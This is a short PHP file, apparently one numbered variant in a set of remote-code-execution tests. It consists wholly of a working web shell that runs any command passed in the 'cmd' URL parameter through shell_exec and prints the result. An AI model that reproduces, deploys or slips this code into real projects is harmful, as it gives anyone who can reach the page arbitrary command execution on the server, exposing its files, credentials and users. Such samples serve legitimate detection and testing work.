<?php
// RCE test variation #534
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>